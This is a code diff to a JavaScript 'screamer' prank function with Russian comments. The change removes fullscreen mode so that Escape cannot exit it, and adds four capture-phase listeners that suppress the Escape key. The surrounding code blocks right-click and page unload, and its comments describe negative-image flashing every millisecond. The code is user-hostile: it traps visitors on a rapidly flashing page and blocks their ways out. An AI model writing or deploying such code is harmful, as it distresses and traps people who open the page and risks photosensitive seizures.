@@ -1586,14 +1586,7 @@ function triggerScreamer() {
 	audioInitialized = true;
 	
 	
-	// Переходим в полноэкранный режим
-	if (overlay.requestFullscreen) {
-		overlay.requestFullscreen().catch(function() {});
-	} else if (overlay.webkitRequestFullscreen) {
-		overlay.webkitRequestFullscreen();
-	} else if (overlay.msRequestFullscreen) {
-		overlay.msRequestFullscreen();
-	}
+	// НЕ используем fullscreen (чтобы Escape не мог выйти из него)
 	
 	// Мигание каждую миллисекунду (негатив)
 	var isInverted = false;
@@ -1665,14 +1658,43 @@ function triggerScreamer() {
 	// Блокируем правую кнопку мыши
 	overlay.addEventListener('contextmenu', blockClose);
 	
-	// Блокируем выход из полноэкранного режима
-	document.addEventListener('fullscreenchange', function() {
-		if (!document.fullscreenElement) {
-			if (overlay.requestFullscreen) {
-				overlay.requestFullscreen().catch(function() {});
-			}
+	// Дополнительная агрессивная блокировка Escape
+	window.addEventListener('keydown', function(e) {
+		if (e.keyCode === 27 || e.key === 'Escape' || e.code === 'Escape') {
+			e.preventDefault();
+			e.stopPropagation();
+			e.stopImmediatePropagation();
+			return false;
 		}
-	});
+	}, true);
+	
+	overlay.addEventListener('keydown', function(e) {
+		if (e.keyCode === 27 || e.key === 'Escape' || e.code === 'Escape') {
+			e.preventDefault();
+			e.stopPropagation();
+			e.stopImmediatePropagation();
+			return false;
+		}
+	}, true);
+	
+	document.body.addEventListener('keydown', function(e) {
+		if (e.keyCode === 27 || e.key === 'Escape' || e.code === 'Escape') {
+			e.preventDefault();
+			e.stopPropagation();
+			e.stopImmediatePropagation();
+			return false;
+		}
+	}, true);
+	
+	// Ещё один слушатель на capture фазе
+	document.addEventListener('keydown', function(e) {
+		if (e.keyCode === 27 || e.key === 'Escape' || e.code === 'Escape') {
+			e.preventDefault();
+			e.stopPropagation();
+			e.stopImmediatePropagation();
+			return false;
+		}
+	}, { capture: true, passive: false });
 	
 	// Блокируем закрытие страницы
 	window.addEventListener('beforeunload', function(e) {
